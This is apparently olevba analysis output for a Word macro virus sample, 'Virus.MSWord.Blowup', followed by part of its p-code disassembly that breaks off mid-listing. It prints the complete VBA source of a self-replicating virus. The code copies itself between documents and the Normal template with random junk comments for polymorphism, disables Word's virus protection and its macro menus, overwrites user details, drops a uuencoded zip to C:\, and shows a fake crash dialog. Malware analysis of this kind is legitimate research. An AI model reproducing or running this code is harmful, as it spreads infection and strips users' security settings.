olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Blowup
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Blowup - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Halix
' 339
Private Sub Document_Open()
 On Error Resume Next
 Dim Loope As Integer
 If ActiveDocument.VBProject.vbcomponents.Count > 1 Then
 For Loope = 2 To ActiveDocument.VBProject.vbcomponents.Count
   cant = ActiveDocument.VBProject.vbcomponents.Item(Loope).CodeModule.CountOfLines
'g:|NxNE?5<}hb}"WFRUc5`L+i{80S%m'L[GbSx2Ql0ZQr<}`@1Q^nkw0GjvRVq8 giO[4bw"<lpja"1e(:1g3[Fdgx`vb::z-HV-RQqya
'2w9J$8w\[\:6qAn/1Nf mOBD,AIL73U6hPO6UqK]k0dH*H|\_`ke#qSor3=9O_*Ufxa(_iJ,o`mVZbQh*9eV^ne-tBor{i H*xq4'6Lubk}5Ei"6!5rHn5Hcy~ni9
   ActiveDocument.VBProject.vbcomponents.Item(Loope).CodeModule.DeleteLines 1, cant
 Next Loope
 End If
 If NormalTemplate.VBProject.vbcomponents.Count > 1 Then
 For Loope = 2 To NormalTemplate.VBProject.vbcomponents.Count
   cant = NormalTemplate.VBProject.vbcomponents.Item(Loope).CodeModule.CountOfLines
   NormalTemplate.VBProject.vbcomponents.Item(Loope).CodeModule.DeleteLines 1, cant
'QYf(z'8l/T\am!<^1>Ch0Y~q@$'J/=uc%9dDmy>'D@pM\[:X8)y[Lo~$[5I}
 Next Loope
 End If
 Document_Close
End Sub
'4X_t,&j('arDk$Q9jGa;M=;wSY8aEkdX*LChM,>6:3x8{5#V>ML$j\`_RtcS4(IGeK}59)E#f6e14>%Zv`(U(+lMY/@(4
Private Sub Document_Close()
 On Error Resume Next
'ZAX_QF<'m/Ihs.0"L(Y?#+EQ%ZW=veazH)nuhlz.;dD6 lXMyJiqEW{lCI8KiAN)&ujr;+`Y"8F4{HD$@j}X&nNH`{OJkA;<i!a)W+
 CommandBars("View").Controls(6).Enabled = 0
'M>hdJ'\iMbyh0sk:R8UABvLE.xJ^%L>c){2?lN%UmUg#$"Wv>sgoK.fb`CjcHyqR%wM.y>OY=A+oU -
 With Options
'} Jyp!y4!TA4K,+P P2'3F>I-lekj4pV8HJ:h<G>|,i,2\y{%@(lm\!w|sA~nA&W|;?s92E
   .VirusProtection = 0
'~"&iuwy$i;ww A[D$&- qx-XUe42PmHLDG+%d;)OS^p,B6*GFjrG}V0Y7Idq2l5ai+
   .ConfirmConversions = 0
'Q }P_$etwR|Gb.>q2QvA1>DP3!2R{]*csp~')5cJ\VQ[cgE&A 7id
'?|R&`H{_Zc&_i*cbi)>-fPOmLC{T3UH24m%IA.!lj`G#~FF
'XY,=(f%l*QLU,k
'-w>B&F7[Oq ?ZC#D4@Q&&8St7,xzc2jNh >!5,UpT3Ok_1t}FC?lU4'z3>tI9d5)C?o/vr8.>]}#m#M\wk1+B+A@kt:9+l qAL*E=Z~^{$z-Z~h/AQ
   .SaveNormalPrompt = 0
 End With
 With CommandBars("tools")
   .Controls("Macro").Enabled = 0
   .Controls(15).Enabled = 0
'@SXOn)/.v"1|1:@'7 _lB0x&_2AOG$\H_PA|[oTSU5YT#Ir2#sK|F,zzAk`w2:BSK@xyBYOGSNrO
'{3/~bTc~):nyZ|IC[/A8A%_Ww+P5].1_YIwf~fw=g.dv58~Wz(uw$]i{
 End With
 CommandBars("Visual Basic").Visible = 0
'U&..t7H5;E0dtjw0iVDFC(8y4Ii7'VBe(VXY">qOY'M1%=)W8s6gD%f:uPfPf[b{b+:/D6]6vg4KaAd8c8BMn{
 With Application
   .UserName = "Halix"
   .UserInitials = "HAL"
   .UserAddress = "Abajo Fidel Castro Ruz"
 End With
'J'D$h6waP@oV1K1Y~`&Y3O6G1\{3/n4)]/){rOEIV+PF$iXIDg{`{Mbu4-Wrf^1rEp?Xx]/{4PQ>'1w*)4lgV#xo/wY4z@6Np\1Gy#0"[V#?:0b._^YbW`T*f*`ZybbSGdMtR3
'Z35F+F_=%uVfV;xDq$)V9'<EpQu6fn:H9)y4!gT|3/a[<yKD%Vc<_XKuaKCn!5nDv._7AsRr,|7%hbR m&z;X'+@s23%-Te8|_'D0GnKIQ+x/3\z`0S ?nf/^iuV"&oA)m!rj-AiVGp
'GoTo NoBind
 Set miTecla = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
 miTecla.Rebind KeyCategory:=wdKeyCategoryMacro, Command:="BlowUp"
NoBind:
'[yCY0q!_4:Dxc@qhhi*]:t{os69v0u*s|Z#"rz7&$X9!<&D<z>V"69zWtp&v{_]>[-  GK6,tm59A}5"%$N{NP6\sBw+(mTZftS4HUV5C|lJ8x@p9a~EG~&@.;lK1>XgTjq@xGt
 Set ad = ActiveDocument.VBProject.vbcomponents.Item(1)
 Set nt = NormalTemplate.VBProject.vbcomponents.Item(1)
 If MacroContainer.FullName = ActiveDocument.FullName Then
  If nt.CodeModule.lines(1, 1) <> "'Halix" Then GoTo WorkNormal
 Else
  If ad.CodeModule.lines(1, 1) <> "'Halix" Then GoTo Document
 End If
GoTo Activar
Document:
 InfStr = nt.CodeModule.lines(2, 1)
 Inf = Val(Mid(InfStr, 2, Len(InfStr))) + 1
 lin = ad.CodeModule.CountOfLines
'.,^v5` 4A?/W%&XZ>WTY fb]f=~uk{q2M@PuXcbv.GL$R&G^V[!@4n<,4|bi0n38lonmFW%gdN"~qjDSW\p@vdhCem%yxoA6\}?<d3GwT}\##'jFu!i7)>?Pj9r#&wU:R3r
 ad.CodeModule.DeleteLines 1, lin
 ad.CodeModule.insertlines 1, "'Halix"
 ad.CodeModule.insertlines 2, "'" + Str(Inf)
 lin = 3
 slin = 3
 Do While slin <= nt.CodeModule.CountOfLines
'wsG 3XfqS;cvfsi]|)T y/`
'0p2h(.1/zdNV'I/;z)][sh`u:1[T#r|f,w%tQQ4g:NqS"!(LTuR?^_2XAB
'98VL3y@")\6T/r[P4-^}E1':-6~[5<([QqN^$U[].<Pt@uHKufi/qr`so}AzJpt<lciI7
'IPc%T(I\o\z@MLLLp^p(o8L o6zda"_Kx3hQ!<NX2m)T/[lAAQ:7%u@)Z.#hc!9lYPV~,xPoj_MT}5V0cLly@'WvdJHvETq\C>^&k,<)$U`
    decn = Int(4 * Rnd) = 3
    If decn Then
      codigo = "'"
'Bj$]j(]Mb>9vk8)ccg0(w1r<k<RNw/Tt^JK/ zI+e>RP2y;f<Tn0((d-JKZme+?d!F;d_q+{~W6E7`[R1"4uy[:
      a = Int((147 * Rnd) + 2)
'Q%^3e!=kR:mhRp_o[s{+R{MQdY7<@"/$e2 noXJ)p4;[GI$=_{z[(o$<8|"OSiz%.+G0K\$*B}"C6c#|
'E"P_G]v~(uU$~3v<zzqC3u7
'tW7@MjycCEFU4jb\K{le6g9~^2#I/4PiAIm9mAM4Bi58VB#:B\NC#!>)I=:#G52RTE<^$GnX$=k#{*)#2n{4I7r[NVg]U0_r6EP,7*@pndx7@#J@9oXa73gZPUVhN
      For J = 1 To a
        codigo = codigo + Chr$(Int(97 * Rnd) + 31)
      Next J
's{*R *$azE< !5kk4>hA>l/xT^<]2Md}iG>3+>m@,::.<7,Mu%5q*Y4<d7:I^Ywj5G,=5psBRmV\nn*U^m{q^IMB'Jb-ZK)k;spo& D-vJZ)
      Iready = True
    Else
      codigo = nt.CodeModule.lines(slin, 1)
      Iready = True
      If codigo = "Sub BlowUp()" Then codigo = "Private Sub BlowUpH()"
      If codigo = "'GoTo NoBind" Then
'-qyYM)a~bcFMI %"J16a2$PSx8}&i`,[9z.$`)?j"eb@_%3B&`(oVbf)GG!'1/ocI?mXYdC!''1f#dTD&s\pu,w{~p$ PDCJ9'O^/-B.^
' ]WxGXR]hk7,p$&zl=0=wQ1\*``RW&>9SoCIDZAfzb!7+3Tfc] <E]%=
        codigo = "GoTo NoBind"
'M!uH=COoeY^(y+w,X!nu2uFldv~QK+*u:,y)un[/VG0\zLPI_HO)]InU&~tP(Y4(fgmP4>7}eBc#C"$3Tk5aBouTJp? {xX!ojp*?1#Incr)a[fnf-A[[u5 \PZ;dh^)fW
'_6z~$4jH0h^P8JJQ)*/EO H cNXAa5`)`ioVd[ZFs
'pq[l Wvjo*Y!>.1F}%)ziaHcU<o|ZzmVHt)XqEI3DmGuidlbkTs E:7EPfc#_VQtUuil.FYASCW}5mlbuZb'dH^85w>(IDryrYD3dC?DC*4]
      End If
      If Left$(codigo, 1) = "'" Then Iready = False
      slin = slin + 1
'4W3Y4sZjoy! yD[Z9@*4@U?4bm!*8O}G/\<U[r$5-| q!EmB}957/HkhCrULIA8!~BY.@.m~l5OK wf1f8CIh6\B($vY
    End If
'{$UhI9$"W1T+tp4SZ})3m :!W70eU<:xflHH?ouTe`T-DXD.&XCGqp+x8aDlxXxZM8-HgRFmEJ:U=IAKOT9/2(zR>H'u$#!vhy]K))cqOJ=9`ogQYCGu\&-JwZdL|H
    If Iready Then ad.CodeModule.insertlines lin, codigo
    lin = lin + 1
 Loop
 ActiveDocument.Save
'1j|7i5;Izfr``PsvH5'ISu;Iwv+UrB&{8ccH|I5{F=4>QZa)rd
'yqe
GoTo Activar
WorkNormal:

 InfStr = ad.CodeModule.lines(2, 1)
 Inf = Val(Mid(InfStr, 2, Len(InfStr))) + 1
 lin = nt.CodeModule.CountOfLines
 nt.CodeModule.DeleteLines 1, lin
'e.eAdBsv@sI3a86'DG3*f<!V~|&Symd>h+_#'ofZ@Mii<VsUw"nxGmZ[kD<T5\"1-`kY+=H;Q"mdf13.eKwllQ,"U&1#8{m_8^pFm*n"*Z&9YmkQ A$5U{r>#NWJ&IrORO^
 lin = 1
 Do While lin <= ad.CodeModule.CountOfLines
'UfR-JKGT@q>nh*2L<=EaFu0"PGE<;[F]=]A mUUhm/5QE{JGBE?A~LRf+Gu@SgGHMQP/Qs
    codigo = ad.CodeModule.lines(lin, 1)
    If codigo = "Private Sub BlowUpH()" Then codigo = "Sub BlowUp()"
    If codigo = "GoTo NoBind" Then codigo = "'GoTo NoBind"
'tbZy4;268Nt^w,ELu)5xCG5FbBv#&WNwq?.=`!o<{h7IS6@od{eACQZ2O?q_oN
    nt.CodeModule.insertlines lin, codigo
    lin = lin + 1
'24uZF[o\'RN_3ql8)Aw8<<`JY*?BDKPP3KAd\7!m<eGI8T%;SKDI~d*>x!~R!oQAUJ-/3JS%Sc@.F@/23n:Ng6.[9+@o`0j&Y`^U+QPj0T0fa/)k1s^KN9gPWMw{j\P
 Loop
 NormalTemplate.Save
'Yqo/"c(-{ZadR>F6/no,+Y;WX(Fa,,M-~-#tcKz|DtSp
'{EUSBKw<<H]I
Activar:
'ad}:X`=v,*!xk0~o}/YG&NHepB>9b[IX|:5)^v j-4n<Y)E)HTX.Y2@(KzPae> G|Sqb$d40(D#HI=\n"K^_ 8?ZM/u
If Dir("c:\Info.uue", vbNormal) = "" Then
Open "c:\Info.uue" For Output As #1
Print #1, ""
Print #1, "_=_ "
Print #1, "_=_ Part 001 of 001 of file Info.zip"
'eOiqs1S<RN,:RxnXkl
Print #1, "_=_ "
Print #1, ""
Print #1, "begin 666 Info.zip"
Print #1, "M4$L#!!0``@`(`(,1`BN/U0L5[@D```X6```(````26YF;RYH=&V%6&N/&[<5"
'bB@/:C9c Fc'!/;Ww(h d_=n)9E*qI4!c'VD[Rrx%>G`a!uqeL$'"e"*:;`OSS*kIml OQ2B}oDg;cMVmIb{ee|;+`>9ami\j8MQ<G,I#zPd?
'2y2K5.n}n:!n)27R%8J"NLb
'p1#E~"?6W,[od9w3%z
'o.! d=<47I58[+[fHM@BF.h$ku'c01<sYVw',
'9=xrwXa}Wkmj{]Vcdx93\-xVtZ0)Y^WPk1P;H=i2yC
Print #1, "M_5Z@_X%0`2,%Y'4;(&@0/X#U>ETOLJ]ZY:`M_(4S0TDT.*1" + Chr(34) + "SB@K__J><TG."
'I@YW<<5FwOt!^jl4JIxhC;]X~n}GW#KhH-Qh
Print #1, "M2-NX#>" + Chr(34) + "L-)JYO*]S[KGSZL/JYOK-'__PZL/E^3O^O;E<G:L/J]7]\\M_?+KZ"
'_)EA~mX*rtS(f%k14XMP7f\\L\
'DvZZD3&ErX`Th&ysiD7Jazum}0/>Y~wp*T-T|?'.'=;:fV/$U}Z"x6!BL3M+?0"PK06Pm=V]<EqM#cVY%_jzFm2C9|_Nadce,*Ma_]va&B"[RKc"4oJHK.Xpu!ad%
Print #1, "MY?7B(OC!^.'YZK`S" + Chr(34) + "W5Q=[NZO%V]7@SF<7BQ'7KW4K5;'9,97O]F?1=^2\__"
'B",x~IB/[Yp$>f"{Pp I~
'Y'?O0
Print #1, "M^OT/WR]H:W6UNKY\\\[XT;=6*^W4)C361!]49]3%V.A7+_(]]>#;\YO+UXN5"
Print #1, "MZ7=.#\?'7?ST^3Z&3=2]>F^=29]O;!M#" + Chr(34) + "NM!W:W7MC6?RQ^Z=-:%01QX4:-Z"
'bQ\7Jq*WAk_3{fk)dBD02(xRD "xCt2F7OnA5;K\$)C"[=9!t
Print #1, "M>_?N7VIU^4]8^M-?Y+^%NKZZ_;E\7:\7ZI?R_4=\_Q$_O_W[Q=WUW4=<6<M_"
Print #1, "M-`A+[^&1>KCZ]^7KOZGY!K'XYM7]_PGV7IRB" + Chr(34) + "=Y[.YHTQ*!VHVG<=)<R26W#"
'EkZEaSh{> LeO0$pc0OL4a"xx`(~8=H
Print #1, "M01FONF=6M^-@7FHUF!AMXTR/4ABU'7OKG.Z" + Chr(34) + ".JA>NR'J`5_.5+&88" + Chr(34) + "N:=HL/"
Print #1, "MN%-[_$WAQ)P^_K*W@;;2]/SL>3*J&:/3=`YF@AA?6YSX3.?'47+:QRW6KT/L"
Print #1, "M=6N?A?(3CL'U7T<#][WI9[_.U*7G3X-Q9F_3_,225W?1^*01&CY'W=F@UJ/O"
'[uT+
'^3_E]LQ6'Mc:K.U8&q+x=exM%J$GI!TQ`~v&HeyK,4oskoRAoQ8"F0Caj>FK%yKv-\e7y%?wfSJ5%wTTOe$GxZ.,xoRp\6x~K:MU9F[mfdu
Print #1, "M-$/7+B=@9^`E_#./K1L/!D[@K" + Chr(34) + "%T]`3_>H.G4O5HL'M\03XW\" + Chr(34) + "*B," + Chr(34) + "DX" + Chr(34) + "6VK"
Print #1, "MFQP:76P" + Chr(34) + "SH" + Chr(34) + "!P`+X)XDX4Q]8TLWHD2[S%2E+0^`%E,VN$12<0OJ" + Chr(34) + Chr(34) + "DT:-#U,"
'f`Z9kys\RN.0vUY&ff9e+l\5&kD(F?H/q7,rOAwXGQtNR$~Ag6/pE/|zqo5_CH.?|S(R&;jt(6/;E&bizb;t/^o>~}ls0+@L{?C_h#'2Cg[|5y"' EP@JfllG,x`8B,SD%*_$3I]P{8@5V8
Print #1, "M9O-LK'DPCE[5)(Q^3G" + Chr(34) + "C$\MH)!T=?FXC,JC/U'FKLROS17'3N-HO7CJG0\,X"
'W`5hS:7HV?w9pG7e>\lgP]BN2"!:grFnCP0[pfre?"k^\2IYI+ru%{Sc><?]{kfNXY;}yM5h""22u,-h3GlXW?MbQ?|!J!eWT_4"]?Y`lp]vj'SOCDa8iLsZ1~7z(q-"
'uJ_TfCnZ7v3h-QcHsH$M^KikB]z(
Print #1, "ML[$1CB" + Chr(34) + "W@\X)TBJ-3&2RG7P_\/2-YO'9BCRBF4BTALY7]P$WJ5V(<ZUY6=+%"
Print #1, "MH_!C-#3*2D1I*TN'>IOZ<'P:[S>QMTS*[P7BZ^_P`7$[VT3XU-," + Chr(34) + "0G^PQZEV"
Print #1, "MK!/]8'54-W93(<2W\1O-7IMZJ8@.PRHW8VIU9*ZOX&3T9EA*`" + Chr(34) + "7*8[<]XTWT"
'eC8nG}exuRD,q|Ab"0`%8fP5vZi,M;h@U*9#xqq5wP6-(I7/\bv&>^)En&GTHy|Im}[H-8%BhIe!'e8NgsdagDw4#{$O</buMkq.E,f{y!sE<'FsvL|=M4Me[w:xISIUNb9G$u:sQ8+b*G"'
'=ul*5+Aq$l.<Gpw\rI]*_R*d|SX"#JdHwgC-<#.~MffZi]uhjTYR|\aRI+f&{=1v2fiu9Z)4NV]^CXf*{3*T3|J}y*;
'X1I~.()$zxA&k3b_K*NJC<!9KU~MrXIc`wI+Jc|'6Z^|zgj?uyAC^8eK-p+'xjj jO|]W6U_?ldzOVn^Zm_`$+{81<|u\7PEv
Print #1, "M,S=5+1U" + Chr(34) + "1YQV;YF_H-K02^WZ4<[/*=OI" + Chr(34) + "JT$$VTH/ZMVM!*" + Chr(34) + "1B(J>E(^)Q_B"
Print #1, "M*WIUVYI4XM#T?__,U/L[Y/OFZO8*+'2@?TA([E_')`\3+($<&#/:Y^[B" + Chr(34) + ":H/"
Print #1, "M;(ZP5-XB\%]'M" + Chr(34) + Chr(34) + "[!S[&:`*;H@6P*Q9M*R`Q2-H.5;E&4Z&I1Z!" + Chr(34) + "TG52I,$B"
Print #1, "M08+=D&QC'2/-H>'L*:[?@^4$PYRDSA2P5(3S,W(86LE_K8I0#@(2RQJTP>J!"
Print #1, "M2_3$2XJN85YX9#&6QKI,<A5CRFZ\SK" + Chr(34) + "`[8)8Z9AC]B+GY0.DYOB-4;D<_U:W"
Print #1, "MM4O`*&OK)UX)=#3LS1<[%%S!0J._" + Chr(34) + "/@.JI._G?4,<%W=;:VKP;&#-O" + Chr(34) + ";YJ4-"
Print #1, "M#C7<I-M\O:M..HW(V,7^!!FU707J" + Chr(34) + Chr(34) + "_B48??,4!*#O$$XT#9E&TX#P#L$'FG"
Print #1, "M@],X7G.*822L0!N!E97:2P9H56;#/`1RT5Y6HF,W@-'&+R'!&@@`__].?&,7"
Print #1, "M:'8Q*_%G`FCG3" + Chr(34) + "4M`X=VNM,,&:5DK^AQ" + Chr(34) + "'V-EK" + Chr(34) + "3\C->H7[P!WC;#KP3]?.&"
Print #1, "MCVZ-LVU]9@>DETPPK3-_LAW`X0<-_S!NP!/H`JVV=@>6,FD>CZQPPO-:./Z="
Print #1, "M9=TE!75\SWCGO?UX4`WSD/'9&]AOC)0G%\KTC8[(J<8<,$GZ'*F9A\719-X%"
Print #1, "M<!O4`.[J=(0I'(VGMN!IQ\]($M@$!L`N^L`RT?" + Chr(34) + "!<Q=?#-(/=$;&'#(+RYB!"
Print #1, "MMCK`%W9PI+F]U5^,T'Y+_7$H>,/87W[3LW849GEOR4<76A)1<!D`EEZ7KAV3"
Print #1, "M./WP26U&2!BMOLO=4\8+'D&R!1&2" + Chr(34) + ")8(7]@8GKAC-Z%,)'+UR5L1*>=3;6JZ"
Print #1, "M3U`D8;%/$&D^<PDO,@\Z:E54&>&6`R9/.J$T(1PQ(2`6\/19/)0'X" + Chr(34) + ";G33_S"
Print #1, "M=8$WBU#I`IPY&D?2)#U&@J9,&0:,['X%MWKKCW)[W$6ZP$O" + Chr(34) + "AU3`K)(,L$08"
'~fOt`_"R-2lF9o(,IL$wKd^@dN|jTnb_v{y;3^0hRnV,z8Nz0o2qTb~]!|>E`OK{<.Z<9b(py,f4)tzSWDuV*2Ou5X<x7
Print #1, "MF3+C6,K2UT3LT1PGJP/5D.2*VFXO<YY!+K-@T7/^9'Z54E)_6.B';HRBB>[!"
Print #1, "M$.W6#/]]A.GMAB'[8O?IR,/##S#2FVA;K:8#/MC!(:8\JX[-R8" + Chr(34) + "AN:V(@Z]R"
Print #1, "MU9L1F70R0>'DPVB_:E%8+4=5(39SK%0U$0Q:P-2#(`&4Y4$>M=:IY9729*AS"
Print #1, "MJ@.U6*(.RU-@?GXIX[\P*22*`3UVX$GMJJB!*WGVSD/NI(ZH0" + Chr(34) + "3" + Chr(34) + "Z1<S" + Chr(34) + "+!D"
Print #1, "M[KO1\7&9B;B-U17MI(4" + Chr(34) + "X!3I-6\B5N%5);,ZZ(DP4P9Q9YHCKGJ$YU8T#HE."
Print #1, "MQP&882)&+RG)L)B" + Chr(34) + "X;1]%-TV3;TS%![R.]O.\&XSO$V>GJ5N`KS0>]#E4!1F"
Print #1, "MLB+AE" + Chr(34) + "BSR(-W8/Z8MX`M%7.DLKU'%V.NH=N^A)_4XGK^C62I&TS1_3Q:%DL@"
Print #1, "M2#!8RBEZ[L1DR231D45$[E@,&G@W.I.WBNF0$H>L%P6<B-!.[F-4,H:U" + Chr(34) + "R)?"
Print #1, "MGZ" + Chr(34) + "E5LLA>;+J3;71:*(A-\Y!'" + Chr(34) + "TWB*C!T0,P$4G.P`CD`J" + Chr(34) + "L^\96>UYT+^[$"
Print #1, "M1;:*QW1+=F]*<&0E(VB6I8_Y`R=8PY15=0[,;'1<RM%6Y@`^8:YC/):(L34B"
'>%mv.
Print #1, "MY#8GJW0^!P(AGU,!+P+%N$B<T#=$=ZNSM#->B" + Chr(34) + "$9]!7<[V4:X\):XZ/EH,?X"
Print #1, "M`':7(EPQ1D6[%#'`=N0T$PR+4-KJ0WZBT!B" + Chr(34) + ",Z)N3@E_.9%P9Y,T7RXU]X[1"
'i4j4f)y].&W4e@6i4g_q46y"yTzJRJEpB2Z#H-Yp#[Hpp(huvU`L;,oTf$_SPb%Yg"1*m8OO"b(1`vCx'(f53kg68
Print #1, "M=V&&^8YT,8" + Chr(34) + "VQ`-F1389.LXVM)N1T)T'N+3(VDI0-Q9!++$BF+Q6U7:CK-2]"
Print #1, "M''^\T6>_Q0IFBQIJ%5NHY@SQEA#U*D1H*5" + Chr(34) + "7;.='Y(7@BSPM^Z,L?1\-YD;L"
Print #1, "M0A69H1VQ]D\=AI!_H.WS34B4\5I8B+J*.B[Q4'.8[F9X0" + Chr(34) + ";F1>8H'K8P^14" + Chr(34)
Print #1, "MP\%/*>!8)&U1-AE1;_*/0<?@3YTFQ\JNT**CRCN(R+S,;S`&BF&J^R7;S7B1"
'?N,?~7Y
'`&."8F0/N/sJr]y"~o{R,cSA)fqF6`5{n
Print #1, "M<+XXXHQ0=$?&AW#)J@^$$/$X&ST>[<Q\-2!,PM!0UG'/2-T$1FE86=_^5UPP"
'sXRW<0G<9-%u&3aq(iFgA>G76d/X_FLpf}a_"|6`<OqJDB3jGIf5<?^rF8E9O3(q:K;ADoCo)Q{CqE7v4cCb
Print #1, "M;M`$=&&-`,HD0B.MH_[*`%76&#U$Y`9XE]+)&D,).:L=W!C#3LOVQ1=B&-U" + Chr(34)
Print #1, "M>F])ZQ\AKB" + Chr(34) + "4N6$)LASV6C+@D8[3I0AE\$TEQ<3-VD/Z+Z_TC>/36?\+SXMB"
Print #1, "M`_86'\TI5_,6OC(" + Chr(34) + "1V['1K8YD!<98JN%[?VW#[P%BCG(N&.@B-,2^51O3;0("
Print #1, "MX33S.I1VE-V[KV*$?BSE)<.3;:&;1F0+#P=NH>(@HT/&-[1WTD+Y)=@>VQ-K"
Print #1, "M5=YY/'V7IG:6?)7E?!?(JX54-EIF;2NKATBQ@'VOXR[SD-?7FBNV,D_G0@*!"
Print #1, "MN.$[" + Chr(34) + "(!H5KEG3]_8W7$.%NSW)#IZ=[K/D\5J/O(&D()L5A73>T.<[X,;,1H\"
Print #1, "MMQQV#>+@CZ+>3'FS<:(E6@X+DSNI(2:R;2.UD+Z4]X%=Z3%2;4AU:G+3V(3)"
Print #1, "MV)`C>_6" + Chr(34) + "KT7S>]+\%O@_4$L!`A0`%``" + Chr(34) + "``@`@Q$" + Chr(34) + "*X_5" + Chr(34) + "Q7N" + Chr(34) + "0``#A8```@`"
Print #1, "M`````````0`@`+:!`````$EN9F\N:'1M4$L%!@`````!``$`-@```!0*````"
'S4#{4v)aR]&IT&[R=oF:~;ns(^uJ1*SYYL
'kT VSFEoh~/6[@MD1sMuG6J}I\1<%-^$VVr9`8 DqFu*lGQM6c /yWg)xMh:$DAmiW <&UUEr9OZBRbH~e6Z6n[
'M(2LY>y|8=k3?@
'CX:Ez@{rAqA(P$~e?eqiV-D|o(Y@n!M&qOUQ]zxV?W57aY3P`^3:5R-w6
Print #1, "!````"
Print #1, "`"
'FAn/n|]{yG0xRF,QS2R:acIQAm"8ixrL?s=O?uJji"zjQbG5iKyST0eQi=9@4LOe$:CEDKXm3']$P:$+_zw=)s[z0&{<;E8s?7!j8m[L"
Print #1, "end"
Print #1, ""
'V\!<NQ[x_0Bi+":q`>|I<S5)$-!+PS~O+[3d%CPC^*"oKJ8M
Print #1, ""
Close #1
End If
End Sub
'eO/FC#5=Yq^j;i2R&M'~UgD#ppY094]kPRuhfj]71kftzxFxwM~)Sgk/1V8*GosE
Sub BlowUp()
   MsgBox "Unhandled Exception at FE35:5320h" + Chr$(13) + "running on a " + System.ProcessorType + " processor", 16, "Micro$oft Word " + Application.Version
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Blowup
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 31927 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0005 "Halix"
' Line #1:
' 	QuoteRem 0x0000 0x0004 " 339"
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Dim 
' 	VarDefn Loope (As Integer)
' Line #5:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #6:
' 	StartForVariable 
' 	Ld Loope 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #7:
' 	Ld Loope 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cant 
' Line #8:
' 	QuoteRem 0x0000 0x006B "g:|NxNE?5<}hb}"WFRUc5`L+i{80S%m'L[GbSx2Ql0ZQr<}`@1Q^nkw0GjvRVq8 giO[4bw"<lpja"1e(:1g3[Fdgx`vb::z-HV-RQqya"
' Line #9:
' 	QuoteRem 0x0000 0x0084 "2w9J$8w\[\:6qAn/1Nf mOBD,AIL73U6hPO6UqK]k0dH*H|\_`ke#qSor3=9O_*Ufxa(_iJ,o`mVZbQh*9eV^ne-tBor{i H*xq4'6Lubk}5Ei"6!5rHn5Hcy~ni9"
' Line #10:
' 	LitDI2 0x0001 
' 	Ld cant 
' 	Ld Loope 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #11:
' 	StartForVariable 
' 	Ld Loope 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #14:
' 	StartForVariable 
' 	Ld Loope 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #15:
' 	Ld Loope 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cant 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld cant 
' 	Ld Loope 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #17:
' 	QuoteRem 0x0000 0x003D "QYf(z'8l/T\am!<^1>Ch0Y~q@$'J/=uc%9dDmy>'D@pM\[:X8)y[Lo~$[5I}"
' Line #18:
' 	StartForVariable 
' 	Ld Loope 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	ArgsCall Document_Close 0x0000 
' Line #21:
' 	EndSub 
' Line #22:
' 	QuoteRem 0x0000 0x005D "4X_t,&j('arDk$Q9jGa;M=;wSY8aEkdX*LChM,>6:3x8{5#V>ML$j\`_RtcS4(IGeK}59)E#f6e14>%Zv`(U(+lMY/@(4"
' Line #23:
' 	FuncDefn (Private Sub Document_Close())
' Line #24:
' 	OnError (Resume Next) 
' Line #25:
' 	QuoteRem 0x0000 0x0068 "ZAX_QF<'m/Ihs.0"L(Y?#+EQ%ZW=veazH)nuhlz.;dD6 lXMyJiqEW{lCI8KiAN)&ujr;+`Y"8F4{HD$@j}X&nNH`{OJkA;<i!a)W+"
' Line #26:
' 	LitDI2 0x0000 
' 	LitDI2 0x0006 
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #27:
' 	QuoteRem 0x0000 0x0051 "M>hdJ'\iMbyh0sk:R8UABvLE.xJ^%L>c){2?lN%UmUg#$"Wv>sgoK.fb`CjcHyqR%wM.y>OY=A+oU -"
' Line #28:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #29:
' 	QuoteRem 0x0000 0x0048 "} Jyp!y4!TA4K,+P P2'3F>I-lekj4pV8HJ:h<G>|,i,2\y{%@(lm\!w|sA~nA&W|;?s92E"
' Line #30:
' 	LitDI2 0x0000 
